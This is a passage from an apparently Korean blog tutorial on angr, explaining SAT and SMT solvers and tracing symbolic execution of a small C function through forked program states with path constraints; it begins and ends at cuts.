mode=display">a\ne0 \wedge 0=2*(a+b)-4 \wedge b=0</script><p>&#xC774;&#xAC8C; &#xC774;&#xAC78; &#xD480;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xAC12;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xADFC;&#xB370; &#xC774;&#xAC70;&#xB294; &#xB610; &#xC5B4;&#xB5BB;&#xAC8C; &#xD480;&#xC5B4;&#x2026; &#xD5C8;&#xD5C8; &#xC548;&#xADF8;&#xB798;&#xB3C4; &#xC218;&#xD559;&#xB3C4; &#xBABB;&#xD558;&#xB294;&#xB370;&#x2026; &#xD558;&#xC9C0;&#xB9CC;&#x2026; </p><p><img src="/2021/07/21/j0ker/angr_part2/zzal.jpeg" alt="./angr_part2/zzal.jpeg"></p><blockquote><p>&#xC194;&#xBC84;&#xCA29; &#xB3C4;&#xC640;&#xC918;!!!</p></blockquote><h2 id="Solver"><a href="#Solver" class="headerlink" title="Solver"></a>Solver</h2><p>&#xC774;&#xC655; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC73C;&#xB2C8; &#xC774;&#xB7F0; &#xC218;&#xC2DD;&#xB3C4; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xC57C;&#xACA0;&#xC8E0;! &#xC800; &#xAC19;&#xC740; &#xC218;&#xD3EC;&#xC790;&#xB3C4; &#xC774;&#xB7F4; &#xB54C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC194;&#xBC84;&#xB77C;&#xB294;&#xAC8C; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xC5ED;&#xC2DC; &#xC138;&#xC0C1;&#xC740; &#xBE60;&#xB974;&#xAC8C; &#xBC1C;&#xC804;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xC800;&#xB9CC; &#xC2DC;&#xB300;&#xC5D0; &#xB9DE;&#xCDB0; &#xB098;&#xAC00;&#xB294;&#xAC8C; &#xC774;&#xB807;&#xAC8C; &#xBC84;&#xAC70;&#xC6B4; &#xAC74;&#xC9C0;&#x2026;) &#xC194;&#xBC84;&#xC5D0;&#xB294; SAT solver&#xC640; SMT solver&#xAC00; &#xC788;&#xB294;&#xB370;, &#xBA3C;&#xC800; SAT solver&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;.</p><h3 id="SAT-solver"><a href="#SAT-solver" class="headerlink" title="SAT solver"></a>SAT solver</h3><p>SAT&#xB294; SATisfiability problem&#xC758; &#xC55E; &#xC138;&#xAE00;&#xC790;&#xB97C; &#xB530;&#xC628; &#xC57D;&#xC790;&#xC785;&#xB2C8;&#xB2E4;. &#xD55C;&#xAD6D;&#xC5B4;&#xB85C;&#xB294; &#xCDA9;&#xC871; &#xAC00;&#xB2A5;&#xC131; &#xBB38;&#xC81C;&#xC778;&#xB370; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xC8FC;&#xB294;&#xAC8C; SAT solver&#xC785;&#xB2C8;&#xB2E4;. &#xCDA9;&#xC871; &#xAC00;&#xB2A5;&#xC131; &#xBB38;&#xC81C;&#xB294; &#xB17C;&#xB9AC; &#xC5F0;&#xC0B0;&#xC790;&#xC640; &#xB17C;&#xB9AC; &#xBCC0;&#xC218;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xB17C;&#xB9AC;&#xC2DD;&#xC774; &#xCC38;&#xC774; &#xB418;&#xB294; &#xBCC0;&#xC218;&#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xCC3E;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>SAT&#xC758; &#xB17C;&#xB9AC;&#xC2DD;&#xC740; <strong>&#xB17C;&#xB9AC; &#xBCC0;&#xC218;</strong>&#xC640; <strong>&#xB17C;&#xB9AC; &#xC5F0;&#xC0B0;&#xC790;</strong>&#xB85C;&#xB9CC; &#xC774;&#xB8E8;&#xC5B4;&#xC838;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0;&#xAC78; &#xBA85;&#xC81C;&#xB17C;&#xB9AC;&#xC2DD;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB17C;&#xB9AC;&#xC5F0;&#xC0B0;&#xC790;&#xC5D0;&#xB294; not, and, or&#xC774; &#xC788;&#xC8E0;. &#xACF1;&#xC148;&#xC774;&#xB098; &#xB354;&#xD558;&#xAE30; &#xB4F1; &#xC5F0;&#xC0B0;&#xC790; &#xC5C6;&#xC774; &#xC774;&#xB7F0; &#xC5F0;&#xC0B0;&#xC790;&#xB4E4;&#xACFC; &#xC774; &#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD55C; true, flase &#xAC19;&#xC740; &#xB17C;&#xB9AC; &#xBCC0;&#xC218;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>$x_1 \wedge \neg x_2 \vee x_3$</p><p>&#xC5EC;&#xAE30;&#xC11C; $x_3$&#xAC00; &#xCC38;&#xC774;&#xC5B4;&#xC11C; &#xB17C;&#xB9AC;&#xC2DD;&#xC774; &#xCC38;&#xC774;&#xB41C;&#xB2E4;&#xBA74;, &#xC774; &#xB17C;&#xB9AC;&#xC2DD;&#xC740; satisfiable&#xD558;&#xB2E4;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC18;&#xBA74;&#xC5D0; &#xC2DD;&#xC774; &#xCC38;&#xC774; &#xB418;&#xB294; &#xBCC0;&#xC218; &#xC870;&#xD569;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xC5B4; &#xAC70;&#xC9D3;&#xC774; &#xB41C;&#xB2E4;&#xBA74; &#xC774; &#xB17C;&#xB9AC;&#xC2DD;&#xC740; unsatisfiable&#xD558;&#xB2E4;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xBA85;&#xC81C;&#xB17C;&#xB9AC;&#xC2DD;&#xC73C;&#xB85C;&#xB9CC; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xC8FC;&#xB294; &#xAC83;&#xC774; SAT solver&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="SMT-solver"><a href="#SMT-solver" class="headerlink" title="SMT solver"></a>SMT solver</h3><p>SMT&#xB294; Satisfiability Modulo Theories&#xC758; &#xC57D;&#xC790;&#xB85C; SAT solver&#xC5D0;&#xC11C; &#xD574;&#xACB0;&#xD558;&#xB358; &#xBA85;&#xC81C;&#xB17C;&#xB9AC;&#xC2DD;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; 1&#xCC28; &#xB17C;&#xB9AC;&#xC2DD;&#xC744; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD55C; solver&#xC785;&#xB2C8;&#xB2E4;. SAT solver&#xC5D0;&#xC11C; &#xD55C;&#xB2E8;&#xACC4; &#xC5C5;&#xADF8;&#xB808;&#xC774;&#xB4DC;&#xB41C; &#xB188;&#xC774;&#xB77C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. 1&#xCC28; &#xB17C;&#xB9AC;&#xC2DD;&#xC5D0;&#xC11C;&#xB294; &#xB17C;&#xB9AC;&#xBCC0;&#xC218;&#xC640; &#xB17C;&#xB9AC;&#xC5F0;&#xC0B0;&#xC790; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB2E4;&#xC591;&#xD55C; &#xC5F0;&#xC0B0;&#xC790;&#xC640; &#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>$(a * 10) &gt; 20 \wedge (b + 20) &lt; 100 \wedge (c &gt; 0)$ </p><p>&#xC774; &#xB17C;&#xB9AC;&#xC2DD;&#xC740; &#xC880; &#xC804;&#xC5D0; foobar &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xB098;&#xC628; &#xC2DD;&#xACFC; &#xC880; &#xB354; &#xBE44;&#xC2B7;&#xD558;&#xC8E0;? &#xB124;. Symbolic Execution&#xC744; &#xD1B5;&#xD574; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xB17C;&#xB9AC;&#xC2DD;&#xC744; &#xBC14;&#xB85C; SMT solver&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xACE0; &#xC774;&#xB7F0; &#xB17C;&#xB9AC;&#xC2DD;&#xC744; SAT solver&#xAC00; &#xB17C;&#xB9AC;&#xC2DD;&#xC744; &#xD480; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xBA85;&#xC81C;&#xB17C;&#xB9AC;&#xC2DD;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB610; SAT sovler&#xC5D0;&#xC11C; &#xB69D;&#xB531;&#xB69D;&#xB531;&#xD574;&#xC11C; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xACC4;&#xC0B0;&#xD574;&#xC8FC;&#xC8E0;!</p><p>&#xC0AC;&#xC2E4; SMT solver&#xAC00; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0;&#xB3C4; &#xAD81;&#xAE08;&#xD574;&#xC11C; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xC815;&#xB9AC;&#xD558;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370; &#xB0B4;&#xC6A9;&#xC774; &#xB108;&#xBB34; &#xB9CE;&#xACE0; &#xC774;&#xAC83;&#xC800;&#xAC83; &#xB2E4; &#xD558;&#xB2E4;&#xAC00;&#xB294; &#xC2DC;&#xAC04; &#xB0B4;&#xC5D0; &#xB2E4; &#xACF5;&#xBD80;&#xB97C; &#xBABB; &#xD560;&#xAC70; &#xAC19;&#xC544;&#xC11C; &#xB2E4;&#xC74C;&#xC5D0; &#xAE30;&#xD68C;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xB2E4;&#xB904;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD00;&#xC2EC; &#xC788;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; Reference 6&#xBC88;&#xC744; &#xCC38;&#xACE0;&#xD574; &#xBCF4;&#xC138;&#xC694;!</p><h2 id="&#xC608;&#xC81C;"><a href="#&#xC608;&#xC81C;" class="headerlink" title="&#xC608;&#xC81C;"></a>&#xC608;&#xC81C;</h2><p>&#xC774;&#xC81C; Symbolic Execution &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C;&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC77C;&#xB2E8; &#xADF8; &#xC804;&#xC5D0; Symbolic Execution &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xB54C; &#xC5B4;&#xB5A4; &#xAC83;&#xB4E4;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCFC;&#xAC8C;&#xC694;.</p><p>&#xC77C;&#xB2E8; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xB54C; &#xCD1D; &#xC138; &#xAC00;&#xC9C0; &#xC694;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD569;&#xCCD0; state&#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><ol><li>$stmt$ : statement&#xC758; &#xC57D;&#xC790;&#xB85C;, &#xB2E4;&#xC74C;&#xC5D0; &#xD3C9;&#xAC00;&#xD560; statement&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. C&#xC5B8;&#xC5B4;&#xB97C; &#xBD84;&#xC11D;&#xD55C;&#xB2E4;&#xACE0; &#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xC5D0; &#xBD84;&#xC11D;&#xD560; &#xCF54;&#xB4DC;&#xB97C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. statement&#xC5D0;&#xB294; &#xC870;&#xAC74;&#xBD80; &#xBD84;&#xAE30;&#xB098; &#xC810;&#xD504; &#xD639;&#xC740; &#xC218;&#xD589;&#xD574;&#xC57C;&#xD560; assignment(&#xC774;&#xAC70;&#xB294; &#xB3D9;&#xC791;&#xC774;&#xB77C;&#xACE0; &#xC774;&#xD574;&#xD558;&#xBA74; &#xD3B8;&#xD560;&#xAC70; &#xAC19;&#xB124;&#xC694;)&#xAC00; &#xC874;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>$\sigma$ : Symbolic Store&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xBCC0;&#xC218;&#xB97C; &#xC2EC;&#xBCFC;&#xB9AD; &#xAC12;&#xACFC; concrete &#xAC12;(&#xACE0;&#xC815;&#xAC12;)&#xC744; &#xB9E4;&#xD551;&#xD55C; &#xB0B4;&#xC6A9;&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, foobar &#xD568;&#xC218;&#xC5D0;&#xC11C; a&#xC640; b&#xB294; &#xAC01;&#xAC01; &#xC2EC;&#xBCFC;&#xB9AD; &#xAC12;&#xC778; $\alpha_a$&#xC640; $\alpha_b$&#xB85C; &#xB9E4;&#xD551;&#xC774; &#xB418;&#xACE0;, x&#xC640; y&#xB294; 1&#xACFC; 0&#xC73C;&#xB85C; &#xCC98;&#xC74C;&#xC5D0; &#xB9E4;&#xD551;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB7F0; &#xB9E4;&#xD551;&#xAD00;&#xACC4;(association)&#xB97C; $\mapsto$ &#xAE30;&#xD638;&#xB85C; &#xD45C;&#xD604;&#xD569;&#xB2C8;&#xB2E4;.(ex. $b \mapsto \alpha_b$)</li><li>$\pi$ : Path Constraint&#xB85C; &#xACBD;&#xB85C; &#xC81C;&#xC57D; &#xC870;&#xAC74;&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xBA74;&#xC11C; &#xC870;&#xAC74;&#xBD80; &#xBD84;&#xAE30;&#xB098; &#xBA85;&#xB839;&#xC5B4;&#xB4E4;&#xC744; &#xAC70;&#xCCD0; $stmt$&#xAE4C;&#xC9C0; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xC704;&#xD574; &#xC55E;&#xC5D0;&#xC11C; &#xC124;&#xC815;&#xD55C; &#xC2EC;&#xBCFC;&#xB9AD; &#xAC12; $a_i$&#xAC00; &#xC5B4;&#xB5A4; &#xAC12;&#xC774; &#xB418;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xB17C;&#xB9AC;&#xC2DD;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C;&#xC5D0;&#xB294; true&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</li></ol><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC55E;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB358; foobar &#xD568;&#xC218;&#xB97C; &#xB2E4;&#xC2DC; &#xAC00;&#xC838;&#xC640;&#xC11C; Symbolic Execution &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xBD84;&#xC11D;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC5D0;&#xC11C;&#xB294; assert &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC885;&#xB8CC;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB294; &#xAC12;&#xC744; &#xCC3E;&#xB294;&#xB370; &#xC9D1;&#xC911;&#xD588;&#xC9C0;&#xB9CC; Symbolic Execution&#xC740; &#xC6D0;&#xB798; &#xBAA8;&#xB4E0; &#xACBD;&#xB85C;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; assert &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xAC00; &#xB418;&#xB294; &#xACBD;&#xB85C;, &#xC885;&#xB8CC;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xB85C; &#xBAA8;&#xB450; &#xD0D0;&#xC0C9;&#xD574; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">1.</span>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foobar</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>{ <span class="hljs-number">2.</span> <span class="hljs-keyword">int</span> x = <span class="hljs-number">1</span>, y = <span class="hljs-number">0</span>;<span class="hljs-number">3.</span> <span class="hljs-keyword">if</span> (a != <span class="hljs-number">0</span>) {<span class="hljs-number">4.</span> y = <span class="hljs-number">3</span>+x;<span class="hljs-number">5.</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>)<span class="hljs-number">6.</span> x = <span class="hljs-number">2</span>*(a+b);<span class="hljs-number">7.</span> }<span class="hljs-number">8.</span> assert(x-y != <span class="hljs-number">0</span>); <span class="hljs-number">9.</span> }</code></pre><p>&#xBA3C;&#xC800; &#xD568;&#xC218; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xBA74;&#xC11C; state&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; Symbolic Store&#xC5D0;&#xC11C; &#xC778;&#xC790; a&#xC640; b&#xB97C; &#xAC01;&#xAC01; &#xC2EC;&#xBCFC;&#xB9AD; &#xAC12;&#xC778; $\alpha_a$&#xC640; $\alpha_b$&#xB85C; &#xB9E4;&#xD551;&#xD569;&#xB2C8;&#xB2E4;.</p><p>$\sigma = { a \mapsto \alpha_a , b \mapsto \alpha_b }$</p><p>&#xC55E;&#xC5D0;&#xC11C; &#xB9D0;&#xD588;&#xB358; &#xAC83;&#xCC98;&#xB7FC; &#xACBD;&#xB85C; &#xC81C;&#xC57D; &#xC870;&#xAC74;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; true&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</p><p>$\pi = true$</p><p>$stmt$&#xB294; &#xBD84;&#xC11D;&#xD574;&#xC57C;&#xD560; &#xCF54;&#xB4DC;&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><p>$stmt =$ <code>2. int x=1, y=0</code></p><p>&#xC815;&#xB9AC;&#xB97C; &#xD558;&#xC790;&#xBA74; &#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB41C; state A&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>state A. $\sigma = { a \mapsto \alpha_a , b \mapsto \alpha_b }$,  $\pi = true$, $stmt =$ <code>2. int x=1, y=0</code></p><p>&#xB2E4;&#xC74C;&#xC5D0; &#xBD84;&#xC11D;&#xD560; &#xCF54;&#xB4DC;&#xAC00; <code>int x=1, y=0</code>&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; &#xBCC0;&#xC218; x,y&#xAC00; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xAC01;&#xAC01; 1&#xACFC; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Symbolic Store $\sigma$&#xC5D0; x&#xC640; y&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xACE0; $stmt$&#xC5D0; &#xBCC4; &#xB2E4;&#xB978; &#xC870;&#xAC74; &#xBD84;&#xAE30;&#xB098; &#xC2EC;&#xBCFC;&#xC5D0; &#xB300;&#xD55C; &#xC870;&#xC791;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACBD;&#xB85C; &#xC81C;&#xC57D; &#xC870;&#xAC74; $\pi$&#xC740; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. $stmt$&#xB294; &#xC55E;&#xC73C;&#xB85C;&#xB3C4; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C;&#xC5D0; &#xBD84;&#xC11D;&#xD560; &#xCF54;&#xB4DC;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB429;&#xB2C8;&#xB2E4;.</p><p>state B. $\sigma = { a \mapsto \alpha_a , b \mapsto \alpha_b, x \mapsto 1, y \mapsto 0 }$,  $\pi = true$, $stmt =$ <code>3. if(a != 0)</code></p><p>&#xC774;&#xC81C; &#xC870;&#xAC74; &#xBD84;&#xAE30;&#xBB38;&#xC774; &#xB098;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218; $a$&#xAC00; 0&#xC774; &#xC544;&#xB2C8;&#xB77C;&#xBA74; if&#xBB38; &#xC548;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xACE0; $a$&#xAC00; 0&#xC774;&#xB77C;&#xBA74; if&#xBB38;&#xC744; &#xD328;&#xC2A4;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xACA0;&#xB124;&#xC694;. &#xC774;&#xB807;&#xAC8C; &#xB418;&#xBA74; Symbolic Execution &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C;&#xB294; fork&#xB97C; &#xD1B5;&#xD574; &#xACBD;&#xB85C; &#xC81C;&#xC57D; &#xC870;&#xAC74;&#xC774; &#xB2E4;&#xB978; &#xB450; &#xAC00;&#xC9C0; state&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>state C. $\sigma = { a \mapsto \alpha_a , b \mapsto \alpha_b, x \mapsto 1, y \mapsto 0 }$,  $\pi = \alpha_a \neq 0$, $stmt =$ <code>4. y = 3+x</code></p><p>state D. $\sigma = { a \mapsto \alpha_a , b \mapsto \alpha_b, x \mapsto 1, y \mapsto 0 }$,  $\pi = \alpha_a = 0$, $stmt =$ <code>8. assert(x-y !=0)</code></p><p>state&#xAC00; &#xC0DD;&#xC131;&#xC774; &#xB418;&#xBA74; &#xAC01;&#xAC01; &#xBCC4;&#xAC1C;&#xB85C; &#xB2E4;&#xC2DC; &#xD0D0;&#xC0C9;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; state D&#xB97C; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;. &#xB2E4;&#xC74C;&#xC5D0; &#xC2E4;&#xD589;&#xD560; &#xCF54;&#xB4DC;&#xB294; &#xD568;&#xC218;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9;&#xC778; assert &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xC870;&#xAC74;&#xC73C;&#xB85C; <code>x-y != 0</code>&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD604;&#xC7AC; $x$&#xB294; 1&#xC774;&#xACE0; $y$&#xB294; 0&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; $x-y = 1-0 = 1 \neq 0$&#xC774; &#xB418;&#xC5B4;&#xC11C; assert &#xD568;&#xC218;&#xB85C; &#xC778;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xC81C; &#xC6B0;&#xB9AC;&#xB294; $\alpha_a = 0$&#xC774;&#xBA74;,  &#xC989; &#xC778;&#xC790; $a$&#xAC00; 0&#xC774;&#xB77C;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xB294; &#xACBD;&#xB85C;&#xB97C; &#xD558;&#xB098; &#xC54C;&#xC544;&#xB0B8; &#xAC83;&#xC774;&#xB124;&#xC694;!</p><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; state C&#xB97C; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. $stmt$&#xAC00; <code>y = 3+x</code>&#xC774;&#xACE0; $x$&#xAC00; 1&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Symbolic Store $\sigma$&#xC5D0; &#xC788;&#xB294; $y$&#xB97C; 4&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>state E.  $\sigma = { a \mapsto \alpha_a , b \mapsto \alpha_b, x \mapsto 1, y \mapsto 4 }$,  $\pi = \alpha_a \neq 0$, $stmt =$ <code>3. if(b == 0)</code></p><p>&#xB610; &#xB2E4;&#xC2DC; &#xC870;&#xAC74; &#xBD84;&#xAE30;&#xBB38;&#xC774; &#xB098;&#xC654;&#xB124;&#xC694;. if&#xBB38; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xC870;&#xAC74;&#xC778; <code>b == 0</code>&#xC5D0; &#xB530;&#xB77C; &#xACBD;&#xB85C; &#xC81C;&#xC57D; &#xC870;&#xAC74; $\pi$&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xC5EC; &#xB450; &#xAC1C;&#xC758; state&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>state F. $\sigma = { a \mapsto \alpha_a , b \mapsto \alpha_b, x \mapsto 1, y \mapsto 4 }$,  $\pi = (\alpha_a \neq 0) \wedge (\alpha_b \neq 0)$, $stmt =$ <code>8. assert(x-y != 0)</code></p><p>state G. $\sigma = { a \mapsto \alpha_a , b \mapsto \alpha_b, x \mapsto 1, y \mapsto 4 }$,  $\pi = (\alpha_a \neq 0) \wedge (\alpha_b = 0)$, $stmt =$ <code>6. x = 2*(a+b)</code></p><p>&#xBA3C;&#xC800; state F&#xB97C; &#xBCF4;&#xC8E0;. Symbolic Store $\sigma$&#xC5D0; &#xC788;&#xB294; $x$&#xAC00; 1&#xC774;&#xACE0; $y$&#xAC00; 4&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; $x-y=-3$&#xC774; &#xB429;&#xB2C8;&#xB2E4;. assert &#xD568;&#xC218;&#xC758; &#xC870;&#xAC74;&#xC774; $x-y \neq 0$&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; 